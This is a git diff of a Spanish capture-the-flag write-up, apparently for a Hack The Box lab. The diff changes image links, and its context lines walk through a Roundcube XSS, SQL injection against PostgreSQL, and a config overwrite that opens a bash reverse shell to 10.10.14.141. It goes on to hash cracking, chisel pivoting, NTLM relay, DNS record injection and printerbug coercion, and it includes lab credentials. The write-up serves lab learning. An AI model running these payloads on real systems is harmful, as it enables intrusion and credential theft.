@@ -11,7 +11,7 @@ Empezamos enviando una traza ICMP a la máquina víctima, para asegurarnos de qu
 ping -c 1 10.129.232.7
 ```
 
-![[Pasted image 20260503195540.png]]
+![](<img/Pasted image 20260503195540.png>)
 
 Una vez confirmamos que el paquete llega, podemos observar que en este caso el ttl es 127. En este caso podemos confirmar que es windows porque por default este tiene 128 de ttl, pero como el paquete pasa por el servidor vpn. Vamos a tirar un escaneo rápido sobre los puertos.
 
@@ -19,7 +19,7 @@ Una vez confirmamos que el paquete llega, podemos observar que en este caso el t
 sudo nmap -sS -Pn -n -vvv --min-rate 5000 10.129.232.7 -p-
 ```
 
-![[Pasted image 20260503195852.png]]
+![](<img/Pasted image 20260503195852.png>)
 
 En este caso tiene el puerto 22 y 80 abiertos, vamos a ver que servicios y versiones estan corriendo en dichos puertos.
 
@@ -28,11 +28,11 @@ sudo nmap -sCV -p22,80 10.129.232.7
 ```
 
 
-![[Pasted image 20260503201104.png]]
+![](<img/Pasted image 20260503201104.png>)
 
 Perfecto nginx, (web o reverse proxy), vamos a entrar.
 
-![[Pasted image 20260503201250.png]]
+![](<img/Pasted image 20260503201250.png>)
 
 Que raro nos ha llevado directamente a "drip.htb", vamos a hacer un curl para ver que es lo que pasa
 
@@ -40,7 +40,7 @@ Que raro nos ha llevado directamente a "drip.htb", vamos a hacer un curl para ve
 curl http://10.129.232.7
 ```
 
-![[Pasted image 20260503201304.png]]
+![](<img/Pasted image 20260503201304.png>)
 
 Vale en este caso tiene una etiqueta meta que redirecciona directamente al vhost, por lo que vamos a añadir ese domino al `/etc/hosts`
 
@@ -48,11 +48,11 @@ Vale en este caso tiene una etiqueta meta que redirecciona directamente al vhost
 sudo bash -c "echo -e '\n10.129.232.7\tdrip.htb'" # tengo zsh por eso pongo bash -c
 ```
 
-![[Pasted image 20260503201423.png]]
+![](<img/Pasted image 20260503201423.png>)
 
 Perfecto, vamos a entrar de nuevo
 
-![[Pasted image 20260503201436.png]]
+![](<img/Pasted image 20260503201436.png>)
 
 Este caso carga, es una landing page, mientras vamos leyendo y viendo la landing page, vamos a tirar en segundo plano gobuster para buscar subdirs o archivos "escondidos", ya que robots.txt no pone nada.
 
@@ -60,11 +60,11 @@ Este caso carga, es una landing page, mientras vamos leyendo y viendo la landing
 gobuster dir -u https://drip.htb -w /usr/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,xml,zip,html,png,jpeg,css,xslx,docx,txt,bak
 ```
 
-![[Pasted image 20260503212008.png]]
+![](<img/Pasted image 20260503212008.png>)
 
 No ha encontrado nada, si ponemos el mause encima del boton "Sign-in" Vemos que nos redirige a otro subdominio `mail.drip.htb`
 
-![[Pasted image 20260503202944.png]]
+![](<img/Pasted image 20260503202944.png>)
 
 Como vemos que pueden haber subdominios dentro del vhost vamos a usar ffuf para buscar otros vhosts cambiando la cabecera `Host` de `HTTP` (como en `Domain Fronting`).
 
@@ -72,63 +72,63 @@ Como vemos que pueden haber subdominios dentro del vhost vamos a usar ffuf para 
 ffuf -u https://10.129.232.7 -H "Host: FUZZ.drip.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-topmillion-200000.txt -ac
 ```
 
-![[Pasted image 20260503202632.png]]
+![](<img/Pasted image 20260503202632.png>)
 
 En este caso solo nos ha encontrado el que teniamos (mail) asi que vamos a añadirlo a `/etc/hosts`
 
 
-![[Pasted image 20260503202754.png]]
+![](<img/Pasted image 20260503202754.png>)
 
 Vamos a entrar
 
-![[Pasted image 20260503203705.png]]
+![](<img/Pasted image 20260503203705.png>)
 
 Al entrar a mail.drip.htb nos pide crearnos una cuenta, vamos a probar hbr si funciona.
 
-![[Pasted image 20260503203718.png]]
+![](<img/Pasted image 20260503203718.png>)
 
 Perfecto, vamos a loguearnos.
 
-![[Pasted image 20260503203731.png]]
+![](<img/Pasted image 20260503203731.png>)
 
 Perfecto parece que estamos en un cliente mail web, nos ha llegado un correo de bienvenida, de momento no nos sirve de mucho.
 
-![[Pasted image 20260503203749.png]]
+![](<img/Pasted image 20260503203749.png>)
 Si volvemos a la página inicial y leemos el código, encontramos algo interesante en el formulario, vamos a revisarlo con burpsuite.
-![[Pasted image 20260503203947.png]]
+![](<img/Pasted image 20260503203947.png>)
 
 Lo enviamos e interceptamos la petición.
 
-![[Pasted image 20260503204004.png]]
+![](<img/Pasted image 20260503204004.png>)
 
 Vale... Encontramos que tiene en un input hidden en el form, diciendo el correo hacia donde se va a enviar, vamos a poner nuestro correo para ver si nos llega
 
-![[Pasted image 20260503204738.png]]
+![](<img/Pasted image 20260503204738.png>)
 
 Perfecto si nos llega
 
-![[Pasted image 20260503205005.png]]
+![](<img/Pasted image 20260503205005.png>)
 
 Lo malo es que hemos puesto en el correo etiquetas html pero las imprime en texto plano.
 
-![[Pasted image 20261011030611.png|384]]
+![](<img/Pasted image 20261011030611.png>)
 
 Analizando mas atentamente la petición vemos que hay un parametro llamado `content` y este tiene el valor de text, vamos a cambiarlo a html para ver si cambia
 
-![[Pasted image 20260503205205.png]]
+![](<img/Pasted image 20260503205205.png>)
 
 Perfecto funciona
 
-![[Pasted image 20260503205237.png]]
+![](<img/Pasted image 20260503205237.png>)
 Vamos a intentar un simple xss.
-![[Pasted image 20260503210908.png]]
+![](<img/Pasted image 20260503210908.png>)
 
 Este no se interprete el codigo javascript.
 
-![[Pasted image 20260503210938.png]]
+![](<img/Pasted image 20260503210938.png>)
 Bueno, vamos a revisar la versión.
 
-![[Pasted image 20260503204118.png]]
+![](<img/Pasted image 20260503204118.png>)
 
 En este caso tenemos la versión 1.6.7 de RoundCube WebMail, por lo que buscando CVEs encontramos el siguiente:
 
@@ -154,15 +154,15 @@ Al pasarlo por la regex se convierta en esto
 
 Si lo probamos
 
-![[Pasted image 20260503211148.png]]
+![](<img/Pasted image 20260503211148.png>)
 
 Llega, vamos a abrir el correo
 
-![[Pasted image 20260503211209.png]]
+![](<img/Pasted image 20260503211209.png>)
 
 Perfecto, en este caso funciona (podriamos haber probado el exploit enviandonos un correo a nosotros mismos :P)
 
-![[Pasted image 20260503211251.png]]
+![](<img/Pasted image 20260503211251.png>)
 
 Ahora vamos a hacer un script (gracias gemini) haciendo que lea el correo con javascript (encodeado en base64) haciendo que podamos leer los correos
 
@@ -180,7 +180,7 @@ for (let i = 1; i <= 100; i++) {
 }
 ```
 
-![[Pasted image 20260503214848.png]]
+![](<img/Pasted image 20260503214848.png>)
 
 haciendo que el payload quede de la siguiente manera
 
@@ -242,39 +242,39 @@ if __name__ == "__main__":
 
 Perfecto, ahora despues de probar diferentes correos, en el correo de bcase@drip.htb le ha llegado uno de ebelford donde le habla sobre un panel de informacion/analiticas y que tiene que cambiar la passwd.
 
-![[Pasted image 20260503221841.png]]
+![](<img/Pasted image 20260503221841.png>)
 
 En este caso añadimos ese subdominio dentro de `/etc/hosts`
 
-![[Pasted image 20260503222057.png]]
+![](<img/Pasted image 20260503222057.png>)
 
 accedemos
 
-![[Pasted image 20260503222158.png]]
+![](<img/Pasted image 20260503222158.png>)
 
 entramos en el login y le damos a que hemos olvidado la contraseña, ponemos el correo
 
-![[Pasted image 20260503222327.png]]
+![](<img/Pasted image 20260503222327.png>)
 
 lo enviamos
 
-![[Pasted image 20260503222336.png]]
+![](<img/Pasted image 20260503222336.png>)
 
 Perfecto lo recibimos, abrimos el link
 
-![[Pasted image 20260503222426.png]]
+![](<img/Pasted image 20260503222426.png>)
 
 ponemos la passwd que queremos
 
-![[Pasted image 20260503222446.png]]
+![](<img/Pasted image 20260503222446.png>)
 
 y ya estamos dentro yay
 
-![[Pasted image 20260503222617.png]]
+![](<img/Pasted image 20260503222617.png>)
 
 Viendo el panel lateral aparte del panel inical encontramos uno que pone "Analytics" en este caso solo al entrar ya pone unerror de sql
 
-![[Pasted image 20260503222703.png]]
+![](<img/Pasted image 20260503222703.png>)
 
 si ponemos un payload basico de sqli
 
@@ -282,11 +282,11 @@ si ponemos un payload basico de sqli
 isma' OR 1=1-- -
 ```
 
-![[Pasted image 20260503223004.png]]
+![](<img/Pasted image 20260503223004.png>)
 
 En este caso para de mostrarnos error
 
-![[Pasted image 20260503223015.png]]
+![](<img/Pasted image 20260503223015.png>)
 
 Asi que tenemos sqli, vamos a verificar la versión
 
@@ -294,7 +294,7 @@ Asi que tenemos sqli, vamos a verificar la versión
 'isma' ; SELECT version; --'
 ```
 
-![[Pasted image 20260503223431.png]]
+![](<img/Pasted image 20260503223431.png>)
 
 la version 15, vale, vamos a verificar si somos superusuario en la base de datos PostgreSQL
 
@@ -302,7 +302,7 @@ la version 15, vale, vamos a verificar si somos superusuario en la base de datos
 'isma' ; SELECT current_setting('is_superuser'); --'
 ```
 
-![[Pasted image 20260503224328.png]]
+![](<img/Pasted image 20260503224328.png>)
 
 En este caso lo somos, vamos a por el `RCE` asi que para ello debemos de cargar la config de postgresql.
 
@@ -310,7 +310,7 @@ En este caso lo somos, vamos a por el `RCE` asi que para ello debemos de cargar 
 'isma' ; lo_import('/etc/postgresql/15/main/postgresql.conf'); --'
 ```
 
-![[Pasted image 20260503225005.png]]
+![](<img/Pasted image 20260503225005.png>)
 
 una vez cargada, nos devolvera un id, vamos a poner este y vamos a hacer que imprima en pantalla la config. 
 
@@ -318,7 +318,7 @@ una vez cargada, nos devolvera un id, vamos a poner este y vamos a hacer que imp
 'isma' ; SELECT encode(lo_get({ID_DEVUELTO}), 'escape'); --'
 ```
 
-![[Pasted image 20260503225035.png]]
+![](<img/Pasted image 20260503225035.png>)
 
 Perfecto, copiamos la config y la modificamos en nuestra máquina, en este caso activamos y modificamos los siguientes parametros
 
@@ -333,7 +333,7 @@ Perfecto, copiamos la config y la modificamos en nuestra máquina, en este caso 
 +archive_timeout = 1 
 ```
 
-![[Pasted image 20260503225705.png]]
+![](<img/Pasted image 20260503225705.png>)
 
 En este caso lo que esta encodeado en base64 es un one liner de una reverse shell básica de bash (asumiendo que es linux y que tiene bash, sinó tocará usar powershell).
 
@@ -341,11 +341,11 @@ En este caso lo que esta encodeado en base64 es un one liner de una reverse shel
 bash -i >& /dev/tcp/10.10.14.141/443 0>&1 #sin encodear
 ```
 
-![[Pasted image 20260503225503.png]]
+![](<img/Pasted image 20260503225503.png>)
 
 Ahora encodeamos toda la config en base64
 
-![[Pasted image 20260503230305.png]]
+![](<img/Pasted image 20260503230305.png>)
 
 y creamos un nuevo proceso (con el id que queramos) subiendo la config módificada.
 
@@ -353,7 +353,7 @@ y creamos un nuevo proceso (con el id que queramos) subiendo la config módifica
 'isma' ; SELECT lo_from_bytea(99999, decode('{encoded_config}', 'base64')); --'
 ```
 
-![[Pasted image 20260503230407.png]]
+![](<img/Pasted image 20260503230407.png>)
 
 La exportamos al archivo de config
 
@@ -361,7 +361,7 @@ La exportamos al archivo de config
 'isma' ; SELECT lo_export(99999, '/etc/postgresql/15/main/postgresql.conf'); --'
 ```
 
-![[Pasted image 20260503230551.png]]
+![](<img/Pasted image 20260503230551.png>)
 
 Preparamos netcat para recibir la reverse shell
 
@@ -369,7 +369,7 @@ Preparamos netcat para recibir la reverse shell
 nc -nvlp 443
 ```
 
-![[Pasted image 20260503230656.png]]
+![](<img/Pasted image 20260503230656.png>)
 
 Y finamente recargamos la config de postgreSQL
 
@@ -377,11 +377,11 @@ Y finamente recargamos la config de postgreSQL
 'isma'; SELECT pg_reload_conf(); --'
 ```
 
-![[Pasted image 20260503230731.png]]
+![](<img/Pasted image 20260503230731.png>)
 
 Si volvemos a netcat ya tenemos reverse shell
 
-![[Pasted image 20260503230752.png]]
+![](<img/Pasted image 20260503230752.png>)
 
 Hacemos tratamiento de la TTY
 
@@ -400,7 +400,7 @@ export TERM=xterm
 stty rows 70 columns 180 # (el tamaño que stty nos ha dado)
 ```
 
-![[Pasted image 20260503231718.png]]
+![](<img/Pasted image 20260503231718.png>)
 
 Imprimimos por pantalla el archivo /etc/hosts para ver si existen otros subdominios o hosts.
 
@@ -408,7 +408,7 @@ Imprimimos por pantalla el archivo /etc/hosts para ver si existen otros subdomin
 cat /etc/hosts
 ```
 
-![[Pasted image 20260503231849.png]]
+![](<img/Pasted image 20260503231849.png>)
 
 En este caso nos chiva que en otro rango de red hay un DC por lo que esta maquina tiene mas de una interfaz, vamos a listar el /etc/passwd para listar usuarios
 
@@ -416,11 +416,11 @@ En este caso nos chiva que en otro rango de red hay un DC por lo que esta maquin
 cat /etc/passwd
 ```
 
-![[Pasted image 20260503231912.png]]
+![](<img/Pasted image 20260503231912.png>)
 
 en este caso solo esta ebelford (el mismo qu envio el correo al otro), vamos a home listamos si hay algo interesante y nada no tenemos permisos
 
-![[Pasted image 20260503232046.png]]
+![](<img/Pasted image 20260503232046.png>)
 
 Vamos a setearnos como Home /var/lib/postgresql porque lo pone en /etc/passwd
 
@@ -429,7 +429,7 @@ HOME="/var/lib/postagresql"
 cd
 ```
 
-![[Pasted image 20260503232138.png]]
+![](<img/Pasted image 20260503232138.png>)
 
 Perfecto ya tenemos user para ssh y poder traer binarios o en general tener una conexion estable y que podamos volver a conectarnos si por alguna razon se cae la conexion sin tener que volver a subir config y recargar, ahora vamos a revisar la base de datos para ello entramos en
 
@@ -443,7 +443,7 @@ listamos las bases de datos
 \list
 ```
 
-![[Pasted image 20260503232522.png]]
+![](<img/Pasted image 20260503232522.png>)
 
 nos conectamos a la de drip mail
 
@@ -451,7 +451,7 @@ nos conectamos a la de drip mail
 \connect dripmail
 ```
 
-![[Pasted image 20260503232532.png]]
+![](<img/Pasted image 20260503232532.png>)
 
 Vamos a imprimir la tabla de admins
 
@@ -459,7 +459,7 @@ Vamos a imprimir la tabla de admins
 select * from "Admins"
 ```
 
-![[Pasted image 20260503232543.png]]
+![](<img/Pasted image 20260503232543.png>)
 
 metemos el hash en un txt
 
@@ -467,7 +467,7 @@ metemos el hash en un txt
 echo "b65cb932ad941c2de600ff3c5c0c9a56" > hash-bcase.txt
 ```
 
-![[Pasted image 20260503232638.png]]
+![](<img/Pasted image 20260503232638.png>)
 
 y lo rompemos con hashcat
 
@@ -475,7 +475,7 @@ y lo rompemos con hashcat
 hashcat hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260503234102.png]]
+![](<img/Pasted image 20260503234102.png>)
 
 En este caso ha encontrado la contraseña que habiamos cambiado, vamos a revisar users
 
@@ -483,7 +483,7 @@ En este caso ha encontrado la contraseña que habiamos cambiado, vamos a revisar
 slect * from Users;
 ```
 
-![[Pasted image 20260503234131.png]]
+![](<img/Pasted image 20260503234131.png>)
 
 guardamos los hashes en un txt y lo rompemos con hashcat
 
@@ -493,7 +493,7 @@ echo -e "d9b9ecbf29db8054b21f303072b37c4e\n1eace53df87b9a15a37fdc11da2d298d\n0ce
 hashcat hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260503235111.png]]
+![](<img/Pasted image 20260503235111.png>)
 
 en este caso hashcat pone exausted asi que no ha conseguido nada, volvemos a el home de postgress. En este caso teniendo en cuenta que somos admin de postgresql vamos a buscar los logs para ver si encontramos la contraseña lekeada de ebelford
 
@@ -502,7 +502,7 @@ cd /var/log/postgress
 zcat *.gz | grep 'ebelford'
 ```
 
-![[Pasted image 20260504080938.png|697]]
+![](<img/Pasted image 20260504080938.png>)
 
 Perfecto tenemos hash, vamos a romperlo
 
@@ -510,9 +510,9 @@ Perfecto tenemos hash, vamos a romperlo
 hashcat hash.txt /usr/share/wordlists/rockyou.txt 
 ```
 
-![[Pasted image 20260504093139.png]]
+![](<img/Pasted image 20260504093139.png>)
 perf tenemos creds, si las probamos por ssh funcionan, vamos a ver si hay algo mas como user `postgress` antes de pasar a ebelford.
-![[Pasted image 20260504080844.png]]
+![](<img/Pasted image 20260504080844.png>)
 
 perfecto un directorio de backups, vamos a entrar
 
@@ -520,7 +520,7 @@ perfecto un directorio de backups, vamos a entrar
 cd backups
 ```
 
-![[Pasted image 20260504080859.png]]
+![](<img/Pasted image 20260504080859.png>)
 
 directorio solo de postgress vamos a entrar
 
@@ -528,7 +528,7 @@ directorio solo de postgress vamos a entrar
 cd postgres && ls
 ```
 
-![[Pasted image 20260504095143.png]]
+![](<img/Pasted image 20260504095143.png>)
 
 perfecto un archivo encriptado con contraseña
 
@@ -536,7 +536,7 @@ perfecto un archivo encriptado con contraseña
 file dev-dripmail.old.sqwl.gpg
 ```
 
-![[Pasted image 20260504095313.png]]
+![](<img/Pasted image 20260504095313.png>)
 
 bueno vamos a bsucar si por var/www tienen algo
 
@@ -544,7 +544,7 @@ bueno vamos a bsucar si por var/www tienen algo
 cd /var/www/ && ls
 ```
 
-![[Pasted image 20260504095354.png]]
+![](<img/Pasted image 20260504095354.png>)
 
 primero como estamos como postgresql vamos a buscar algun archivo de credenciales en `/var`.
 
@@ -553,7 +553,7 @@ find . -type f -name ".*env*" 2>/dev/null
 cat www/html/dashboard/.env
 ```
 
-![[Pasted image 20260504095556.png]]
+![](<img/Pasted image 20260504095556.png>)
 
 perfecto tenemos una credencial, vamos a ver si de nuevo como pasa con ebelford (el user) se repiten creds, las probamos
 
@@ -561,15 +561,15 @@ perfecto tenemos una credencial, vamos a ver si de nuevo como pasa con ebelford 
 gpg --batch -d dev-dripmail.old.sql.gpg
 ```
 
-![[Pasted image 20260504111056.png]]
+![](<img/Pasted image 20260504111056.png>)
 
 Perfecto, se ha abierto
 
-![[Pasted image 20260504111339.png]]
+![](<img/Pasted image 20260504111339.png>)
 
 vamos a buscar creds de admins
 
-![[Pasted image 20260504113117.png]]
+![](<img/Pasted image 20260504113117.png>)
 
 mas hashes vamos a intentar romperlos
 
@@ -577,7 +577,7 @@ mas hashes vamos a intentar romperlos
 hashcat -m 0 hashes2.txt --show
 ```
 
-![[Pasted image 20260504113410.png]]
+![](<img/Pasted image 20260504113410.png>)
 
 En este caso encontramos de nuevo la cred de ebelford que ya teniamos pero ahora nos da la de victor.r, vamos a buscar si hay algo mas a hacer aqui, antes de probar las creds de ebelford y victor contra el dominio
 
@@ -586,7 +586,7 @@ find / -type f -writable 2>/dev/null
 find / -type f -perm 4000 2>/dev/null
 ```
 
-![[Pasted image 20260504100736.png]]
+![](<img/Pasted image 20260504100736.png>)
 
 nada, vamos a conectarnos por ssh para trabajar mejor
 
@@ -594,7 +594,7 @@ nada, vamos a conectarnos por ssh para trabajar mejor
 ssh ebelford@10.127.232.7
 ```
 
-![[Pasted image 20260504093723.png]]
+![](<img/Pasted image 20260504093723.png>)
 
 vamos a setear el HOME durante esta sesion en un directorio temporal para trabajar mejor
 
@@ -604,7 +604,7 @@ echo $HOME
 cd
 ```
 
-![[Pasted image 20260504100717.png]]
+![](<img/Pasted image 20260504100717.png>)
 
 Nos descargamos chisel
 
@@ -614,7 +614,7 @@ wget "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5
 
 En este caso dice que no puede resolver github.com, por lo que asumimos que no tiene acceso a internet.
 
-![[Pasted image 20260504101633.png]]
+![](<img/Pasted image 20260504101633.png>)
 
 Así que en este caso, vamos a descargarlo en nuestra máquina atacante y de ahi pasarlo mediante `HTTP` a la máquina objetivo. Pero primero lo tenemos que descomprimir y hacer el nombre más corto para poder trabajar mejor.
 
@@ -623,7 +623,7 @@ wget "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5
 gzip -d chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel
 ```
 
-![[Pasted image 20260504102305.png]]
+![](<img/Pasted image 20260504102305.png>)
 
 Ahora hacemos lo mismo con nmap, aunque en este caso no podemos hacer un escaneo SYN ya que este necesitaría ROOT. Pero a diferencia de hacer nuestro escaner con bash, con nmap podemos ver los servicios que corren y versiones.
 
@@ -632,7 +632,7 @@ wget "https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries
 chmod +x nmap
 ```
 
-![[Pasted image 20260504102414.png]]
+![](<img/Pasted image 20260504102414.png>)
 
 Una vez ya tenemos todo hecho, desde la máquina objetivo descargamos los binarios.
 
@@ -642,7 +642,7 @@ wget http://10.10.14.141:8081/chisel
 ls
 ```
 
-![[Pasted image 20260504102551.png]]
+![](<img/Pasted image 20260504102551.png>)
 Para poder hacer pivoting, primero debemos ejecutar el chisel como servidor para que se conecte la maquina objetivo.
 
 ```bash
@@ -652,7 +652,7 @@ sudo ./chisel --reverse --port # En nuestra máquina atacante
 ./chisel client 10.10.14.141:443 R:socks &
 ```
 
-![[Pasted image 20260504103041.png]]
+![](<img/Pasted image 20260504103041.png>)
 En este caso podemos ver como se ha realizado la conexión con éxito, la cosa es que en este caso he usado el puerto 443 (opsex). Una vez tenemos esto, debemos de configurar proxychains para poder usar chisel como proxy, para eso podemos simplemente usar este one liner (pongo bash -c porque aveces zsh quiere discutir).
 
 ```bash
@@ -661,21 +661,21 @@ sudo bash -c "echo -e'\nsocks5\t127.0.0.1 1080 >> /etc/proxychains4.conf"
 cat /etc/proxychains4.conf
 ```
 
-![[Pasted image 20260504103216.png]]
+![](<img/Pasted image 20260504103216.png>)
 Perfecto, una vez lo tenemos configurado, podemos hacer un escaneo de ips, en este caso me apetecia hacerlo con bash, ya que no debería haber ningún firewall, pero también podriamos haber utilizado el binario de nmap.
 
 ```bash
 set +m; for i in {1..254}; do (ping -c 1 -W1 172.16.20.$i &>/dev/null && echo "[+] - La ip 172.16.20.$i esta activa.) & done; wait
 ```
 
-![[Pasted image 20260504104607.png]]
+![](<img/Pasted image 20260504104607.png>)
 En este caso encontramos que tenemos 3 hosts que han respondido sobre nuestras trazas ICMP, como hay un DC, asumo que son máquinas parte del Directorio Activo, asi que vamos a usar `nxc` para identificarlos.
 
 ```bash
 proxychains -q nxc smb 172.16.20.1
 ```
 
-![[Pasted image 20260504104657.png]]
+![](<img/Pasted image 20260504104657.png>)
 
 Perfecto, como vimos antes la `.1` es el DC.
 
@@ -683,34 +683,34 @@ Perfecto, como vimos antes la `.1` es el DC.
 proxychains nxc smb 172.16.20.2
 ```
 
-![[Pasted image 20260504104902.png]]
+![](<img/Pasted image 20260504104902.png>)
 En la `.2` tenemos un servidor que se llama `WEB-01`. La `.3` no hace falta ya que es la otra interfaz de la máquina que estamos usando de puente. Así que vamos a hacer un escaneo de puertos con el binario que hemos traido de nmap.
 
 ```bash
 nmap -p- -Pn -n -vvv --min-rate 172.16.20.2
 ```
 
-![[Pasted image 20260504105250.png]]
+![](<img/Pasted image 20260504105250.png>)
 Vale, puerto 80 y 445 abierto. Vamos a ver el DC.
 
 ```bash
 nmap -p- -Pn -n -vvv --min-rate 5000 172.16.20.1
 ```
 
-![[Pasted image 20260504105423.png]]
+![](<img/Pasted image 20260504105423.png>)
 En este caso tiene también ssh. Bueno empezamos con el servidor `WEB-01`.Entramos en el puerto 80 (con foxyproxy apuntando al servidor chisel) y tiene la web default de windows server, nada relevante porque no hay login.
 
-![[Pasted image 20260504105940.png]]
+![](<img/Pasted image 20260504105940.png>)
 
 La 172.16.20.1 es el drip mail ya estabamos (lo de antes era un reverse proxy??).
 
-![[Pasted image 20260504110028.png]]
+![](<img/Pasted image 20260504110028.png>)
 Nos redirige directamente a el dominio como antes.
-![[Pasted image 20260504110040.png]]
+![](<img/Pasted image 20260504110040.png>)
 
 En la `.2` en el puerto 5000 tiene login.
 
-![[Pasted image 20260504110105.png]]
+![](<img/Pasted image 20260504110105.png>)
 
 Bueno, vamos a probar las creds que tenemos en el smb.
 
@@ -718,20 +718,20 @@ Bueno, vamos a probar las creds que tenemos en el smb.
 proxychains -q nxc smb 172.16.20.2 -u ebelford -p ThePlague@1780
 ```
 
-![[Pasted image 20260504190627.png]]
+![](<img/Pasted image 20260504190627.png>)
 El usuario Ebelford al parecer no existe en el AD, así que vamos a probar con el resto de creds que tenemos, empezando por `victor.r`.
 
 ```bash
 proxychains -q netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --shares
 ```
 
-![[Pasted image 20260504190508.png]]
+![](<img/Pasted image 20260504190508.png>)
 Perfecto, tenemos un user, vamos enumerar la configuración del AD para ver hacia donde dirigir nuestra atención
 ```cmd
 proxychains netexec ldap 172.16.20.1 -u victor.r -p victor1gustavo@# -M maq -M adcs
 ```
 
-![[Pasted image 20260504190727.png]]
+![](<img/Pasted image 20260504190727.png>)
 
 Como no podemos registrar máquinas para abusar de `RBCD` (MAQ es 0), pero expone los servicios web de `AD CS` vamos a dirigir nuestra atención a esto. Pero antes vamos a recolectar todos los datos del dominio (grupos, relacions de confianza, ACLs, etc.)
 
@@ -739,38 +739,38 @@ Como no podemos registrar máquinas para abusar de `RBCD` (MAQ es 0), pero expon
 proxychains bloodhound-python -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' -c all -ns 172.16.20.1 --dns-tcp --zip -gc dc-01.darkcorp.htb
 ```
 
-![[Pasted image 20260504191851.png]]
+![](<img/Pasted image 20260504191851.png>)
 En este caso no tenemos ningúna via directa como `victor.r` para admin, asi que vamos a seguir búscando otros vectores.
-![[Pasted image 20260504195144.png]]
+![](<img/Pasted image 20260504195144.png>)
 En este caso en la el puerto `5000` de `WEB-01` vamos a probar las creds de `victor.r`-
-![[Pasted image 20260504195910.png]]
+![](<img/Pasted image 20260504195910.png>)
 Perfecto, estamos dentro. En este caso tenemos como un panel de administración, en este caso, nos muestra que tanto `WEB-02`, `WEB-03` como `DB-01` y `DB-02` no funcionan o están caidos. Si por ejemplo hubiera alguna tarea CRON para algúna carpeta `SMB` hacia alguno de esos hosts, con un simple responder podríamos pillar hash. Hbr para que es esta info.
-![[Pasted image 20260504200456.png]]
+![](<img/Pasted image 20260504200456.png>)
 Vale... En este caso tenemos una herramienta que nos permite comprobar el estatus de los hosts, en este caso sabemos que el puerto `8080` en `WEB-01` no esta abierto, así que vamos a hacer port forwarding, trayendonos nuestro puerto `8000` para que se muestre en el puerto `8080` de `WEB-01`.
 
 ```bash
 ./chisel client 10.10.14.141:4443 8080:0.0.0.0:8000 R:socks &
 ```
 
-![[Pasted image 20260504205154.png]]
+![](<img/Pasted image 20260504205154.png>)
 Perfecto, ya lo tenemos montado. Vamos a usar ntlm relay por si lo usa, en el caso de que no lo use auth por NTLM por http, simplemente podremos ver la petición.
 
 ```bash
 sudo proxychains -q ntlmrelayx.py -t ldap://172.16.20.1 --http-port 8000
 ```
 
-![[Pasted image 20260504204948.png]]
+![](<img/Pasted image 20260504204948.png>)
 Enviamos la petición desde la web.
-![[Pasted image 20260504205030.png]]
+![](<img/Pasted image 20260504205030.png>)
 Perfecto, tenemos NTLM de la cuenta `SVC_ACC` :P. Se autentica contra el dominio, asi que vamos a intentar autenticarnos contra `AD CS` para solicitar un certificado `pfx`.
 
 ```bash
 sudo proxychains -q ntlmrelayx.py -t https://dc01.darkcorp.htb/certsrv/certfnsh.asp --adcs --http-port 8000
 ```
 
-![[Pasted image 20260504205110.png]]
+![](<img/Pasted image 20260504205110.png>)
 Vale en este caso no nos deja, si revisamos bloodhound encontramos que la cuenta `SVC_ACC` es parte del grupo `DNSADMINS`.
-![[Pasted image 20261012160852.png]]
+![](<img/Pasted image 20261012160852.png>)
 
 Por lo que en este caso vamos a crear un resgistro DNS, esto nos permitirá forzar ciertas conexiones contra nuestra máquina pero que las máquinas victimas piensen que se autentican contra el dc. En este caso ponemos la ip de núestra máquina atacante ya que solo nos interesa que `WEB-01` tenga acceso a esta.
 
@@ -778,35 +778,35 @@ Por lo que en este caso vamos a crear un resgistro DNS, esto nos permitirá forz
 sudo proxychains -q ntlmrelayx.py -t ldaps://172.16.20.1 --http-port 8000 --add-dns-record 'dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.141 --no-dump --no-da --no-validate-privs
 ```
 
-![[Pasted image 20260504210130.png]]
+![](<img/Pasted image 20260504210130.png>)
 Perfecto, si hacemos un `nslookup` (un ping tmb valdría) desde `WEB-01` encontramos que el registro DNS esta bien hecho.
 
 ```bash
 nslookup dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb
 ```
 
-![[Pasted image 20260504210221.png]]
+![](<img/Pasted image 20260504210221.png>)
 Una vez tenemos esto, ponemos en escucha a `kbrelayx` para que cuando se autentique contra nosotros, podamos perdir un ceriticado `pfx`.
 
 ```bash
 sudo proxychains -q ./krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$'
 ```
 
-![[Pasted image 20260504215542.png]]
+![](<img/Pasted image 20260504215542.png>)
 En este caso lo que hacemos (aunque en la captura tenemos spoiler), es el hecho de que nos aprovecharemos de el registro DNS que hemos creado para forzar a la máquina `WEB-01` autenticarse contra nuestro equipo mediante `MS-RPRN` aunque también podríamos haber usado `MS-EFSR` si printerbug hubiera sido bloqueado. Lo que hacemos es decirle a `WEB-01` que le indique a nuestra máquna una notificación de cambio de estado, lo divertido es que en vez de hacerlo con el usuario que ya tenemos creds `victor.r`, este lo hace con la cuenta del equipo del dominio, por lo que en este caso cuando se autentica contra `https://dc-01.darkcorp.htb/certsrv/certfnsh.asp` conseguimos el certificado `pfx` for free :P
 
 ```bash
 proxychains -q uv run --script ./printerbug.py 'darkcorp/victor.r':'victor1gustavo@#'@WEB-01.darkcorp.htb dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
 ```
 
-![[Pasted image 20260504215553.png]]
+![](<img/Pasted image 20260504215553.png>)
 En este caso por mucho que nos diga que puede ser que no haya funcionado, sabemos que lo ha hecho, por lo que vamos a listar el directorio actual.
 
 ```bash
 ls | grep ".pfx"
 ```
 
-![[Pasted image 20260504215620.png]]
+![](<img/Pasted image 20260504215620.png>)
 
